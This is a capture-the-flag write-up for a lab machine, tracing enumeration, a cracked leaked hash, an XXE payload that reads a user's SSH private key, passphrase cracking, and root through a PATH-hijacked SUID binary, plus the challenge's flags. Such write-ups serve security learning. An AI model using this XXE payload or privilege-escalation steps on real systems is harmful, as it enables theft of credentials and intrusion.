# CTF Writeup


> **Date:** 2025-12-27  
> **Difficulty:** Easy  
> **Attack Path:** Information Disclosure → XXE → SSH Key Extraction → PATH Hijacking (PrivEsc)  

---

## Target Information

**IP Address:** `10.81.157.72`  

---

## Nmap Scan

**Command:**

```bash
nmap -sC -sV -p- 10.81.157.72
```

**Open Ports:**

- 22/tcp → SSH (OpenSSH 7.2p2)  
- 80/tcp → HTTP (Apache 2.4.18)  
- 8765/tcp → HTTP (Nginx 1.10.3)  

---

## Web Enumeration

**Command:**

```bash
gobuster dir -u http://10.81.157.72/ -w /usr/share/wordlists/dirb/big.txt
```

**Interesting Paths:**

```
/custom/
/robots.txt
```

---

## Credentials Discovery

A backup file was discovered containing credentials:

```
http://10.81.157.72/custom/js/users.bak
```

**Hash:**

```
admin:1868e36a6d2b17d4c2745f1659433a54d4bc5f4b
```

After cracking (SHA1):

```
admin:bulldog19
```

---

## XXE Injection

An XXE vulnerability was identified on port `8765`.

The following payload was used to extract Barry’s SSH private key:

```xml
<?xml version="1.0"?>
<!DOCTYPE test [
  <!ENTITY key SYSTEM "file:///home/barry/.ssh/id_rsa">
]>
<comment>
  <name>&key;</name>
  <author>admin</author>
  <text>test</text>
</comment>
```

---

## Cracking SSH Passphrase

1. Save the key as `id_rsa` and set permissions:

```bash
chmod 600 id_rsa
```

2. Convert the key for cracking:

```bash
python3 /usr/share/john/ssh2john.py id_rsa > hash.txt
```

3. Crack the passphrase:

```bash
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

**Passphrase found:**

```
urieljames
```

**Login:**

```bash
ssh -i id_rsa barry@10.81.157.72
```

---

## Privilege Escalation

### SUID Enumeration

```bash
find / -perm -4000 -type f 2>/dev/null
```

**Result:**

```
/home/joe/live_log
```

---

### PATH Hijacking Exploit

```bash
cd /tmp
echo "/bin/bash -p" > tail
chmod +x tail
export PATH=/tmp:$PATH
/home/joe/live_log
```

This resulted in privilege escalation.

---

## Final Flags

**User:**

```
62d77a4d5f97d47c5aa38b3b2651b831
```

**Root:**

```
3223581420d906c4dd1a5f9b530393a5
```

---

## Conclusion

This challenge demonstrates a full attack chain starting from information disclosure, leading to XXE exploitation, SSH key extraction, and ending with privilege escalation via PATH hijacking.

Each step highlights the importance of proper input validation, secure credential storage, and safe environment variable handling.
